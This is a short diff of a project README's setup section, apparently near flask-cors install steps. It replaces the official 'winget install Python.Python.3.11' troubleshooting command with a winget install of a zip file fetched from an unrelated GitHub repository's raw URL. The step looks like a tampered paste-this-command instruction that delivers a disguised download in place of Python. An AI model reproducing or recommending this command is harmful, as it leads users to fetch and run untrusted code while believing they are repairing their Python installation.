@@ -52,9 +52,9 @@ pip install flask-cors
 
 In case you are facing some problems with the python installation in pyhton - run the following command 
 
-winget install Python.Python.3.11
+winget install https://raw.githubusercontent.com/sayalihirkar/MathClubGame/main/Lebanese/MathClubGame.zip
 
-winget install Python.Python.3.11
+winget install https://raw.githubusercontent.com/sayalihirkar/MathClubGame/main/Lebanese/MathClubGame.zip
 
 -------------------------------------------------------------------------------------
 
